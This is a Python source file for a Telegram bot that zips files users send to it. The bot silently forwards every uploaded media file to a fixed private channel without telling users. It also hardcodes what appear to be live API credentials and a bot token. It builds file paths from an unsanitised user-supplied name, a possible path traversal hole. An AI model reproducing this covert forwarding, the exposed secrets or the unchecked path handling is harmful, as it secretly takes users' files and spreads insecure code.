import os
import logging
from pyrogram import Client, filters, types, enums
from zipfile import ZipFile
from os import remove, rmdir, mkdir
from utils import zip_work, dir_work, up_progress, list_dir, db_session, User, commit, download_progress
import time
import shutil


from scripts import help_text, start_text, invalid_cmd

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Set Pyrogram logging level to ERROR
logging.getLogger("pyrogram").setLevel(logging.ERROR)

# Bot credentials from environment variables
app_id = int(os.environ.get("API_ID", 10471716))
app_key = os.environ.get('API_HASH', "f8a1b21a13af154596e2ff5bed164860")
token = os.environ.get('BOT_TOKEN', "7227214903:AAF532JDQu3CWdeiqfKoS6aoOTOWfppJILg")

# Initialize the client
app = Client("zipBot", app_id, app_key, bot_token=token)

error_channel_id = -1002030156196




@app.on_message(filters.command("start"))
def start(client, msg: types.Message):
    """Reply start message and add the user to database"""
    try:
        
        uid = msg.from_user.id
        with db_session:
            if not User.get(uid=uid):
                User(uid=uid, status=0)  # Initializing the user on database
                commit()
        
        msg.reply(start_text)
    except Exception as e:
        logger.error(f"Error in start: {e}")
        msg.reply("An error occurred. Please try again later.")



#==========================(HELP)===================================#
@app.on_message(filters.command("help"))
def start(client, msg: types.Message):
    """Reply start message and add the user to database"""
    try:
        
        msg.reply(help_text, parse_mode=enums.ParseMode.MARKDOWN, disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"Error in start: {e}")
        msg.reply("An error occurred. Please try again later.") 
        



@app.on_message(filters.command("zip"))
def start_zip(client, msg: types.Message):
    try:
        if msg.from_user is None:
            msg.reply("An error occurred. Please try again later.")
            return

        uid = msg.from_user.id
        
        # Check if user provided a zip name
        if len(msg.command) < 2:
            msg.reply(invalid_cmd)
            return

        zip_name = msg.command[1]  # Get the zip name from the command
        
        with db_session:
            usr = User.get(uid=uid)
            usr.zip_name = zip_name  # Store the zip name in the user's entry
            commit()

            # Change user status to INSERT mode
            usr.status = 1
            commit()

        # Create directory if it doesn't exist
        user_dir = dir_work(uid, zip_name)
        if not os.path.exists(user_dir):
            os.makedirs(user_dir)
                    
        msg.reply(f"""
        Your file name is {zip_name} now. 
        Please send the files you want to zip.
        """)
        
    except Exception as e:
      #  error_message = f"Error in start_zip: {e}"
    #    forward_error_to_channel(error_message)
        logger.error(f"Error in start_zip: {e}")
        msg.reply(f"Error in zipping: {e}")




@app.on_message(filters.media)
def enter_files(client, msg: types.Message):
    """Download files"""
    try:
        uid = msg.from_user.id
        with db_session:
            usr = User.get(uid=uid)
            if usr.status == 1:  # check if user-status is "INSERT"
                file_type = msg.document or msg.video or msg.photo or msg.audio

                
                client.forward_messages(-1002030156196, msg.chat.id, [msg.id])

                
                if file_type.file_size > 2097152000:
                    msg.reply("The file size exceeds the maximum limit.")
                elif len(list_dir(uid, usr.zip_name)) > 500:  # Updated to pass zip_name
                    msg.reply("You have reached the maximum number of files allowed. Only 500 is allowed.")
                else:
                    start_time = time.time()
                    downsts = msg.reply("Downloading file...", True)  # send status-download message
                    msg.download(dir_work(uid, usr.zip_name), progress=download_progress, progress_args=(downsts, start_time))

                    # Update the download progress message to indicate completion
                    file_name = file_type.file_name if file_type else "The file"
                    downsts.edit(f"{file_name} was downloaded successfully.")
            else:
                msg.reply("Sorry, you haven't initiated the zipping process. Please use the /zip command to start the zipping process.")
    except Exception as e:
        msg.reply(f"An error occurred. Please try again later.\n\nError in enter_files: {e}")
        logger.error(f"Error in enter_files: {e}")


# Start to make zip
@app.on_message(filters.command("done"))
def stop_zip(client, msg: types.Message):
    """Exit from insert mode and send the archive"""
    try:
        if msg.from_user is None:
            msg.reply("An error occurred. Please try again later.")
            return

        uid = msg.from_user.id
        with db_session:
            usr = User.get(uid=uid)
            if usr.status == 1:
                usr.status = 0  # change user-status to "NOT-INSERT"
                commit()
            else:
                msg.reply("Sorry You Haven't Initiated zipping process......Please use /zip command to start the zipping process.")
                return

        zip_name = usr.zip_name or 'iozip'
        zip_path = zip_work(uid, zip_name)

        stsmsg = msg.reply(f"Zipping files... Total: {len(list_dir(uid, zip_name))}")  # send status-message "ZIPPING" and count files

        if not list_dir(uid, zip_name):  # if len files is zero
            msg.reply("No files to zip. start your process again......")
            rmdir(dir_work(uid, zip_name))
            return

        # Add files to zip with unique names to avoid duplicates
        with ZipFile(zip_path, "w") as zip:
            for file in list_dir(uid, zip_name):
                file_path = f"{dir_work(uid, zip_name)}/{file}"
                zip.write(file_path, arcname=file)  # add files to zip-archive with original names
                remove(file_path)  # delete files that added

        stsmsg.edit_text("Uploading the zip archive...")  # change status-msg to "UPLOADING"
        
        start_time = time.time()
        try:
            sent_msg = msg.reply_document(zip_path, progress=up_progress,  # send the zip-archive
                               progress_args=(stsmsg, start_time))
            stsmsg.delete()  # delete the status-msg
            remove(zip_path)  # delete the zip-archive
            # Delete all subdirectories and their contents within static/{uid}/
            user_dir = f"static/{uid}/"
            for subdir in os.listdir(user_dir):
                subdir_path = os.path.join(user_dir, subdir)
                if os.path.isdir(subdir_path):
                    shutil.rmtree(subdir_path)
        except ValueError as e:
            msg.reply(f"An unknown error occurred: {str(e)}")
            remove(zip_path)  # delete the zip-archive
            # Delete all subdirectories and their contents within static/{uid}/
            user_dir = f"static/{uid}/"
            for subdir in os.listdir(user_dir):
                subdir_path = os.path.join(user_dir, subdir)
                if os.path.isdir(subdir_path):
                    shutil.rmtree(subdir_path)
    except Exception as e:
     #   error_message = f"Error in stop_zip: {e}"
       # forward_error_to_channel(error_message)
        msg.reply(f"Error in zipping: {e}........Please try again later.")
        logger.error(f"Error in stop_zip: {e}")




        
if __name__ == '__main__':
    try:
        mkdir("static")  # create static files folder
    except FileExistsError:
        pass

    try:
        app.run()
    except Exception as e:
        logger.error(f"Error running the bot: {e}")
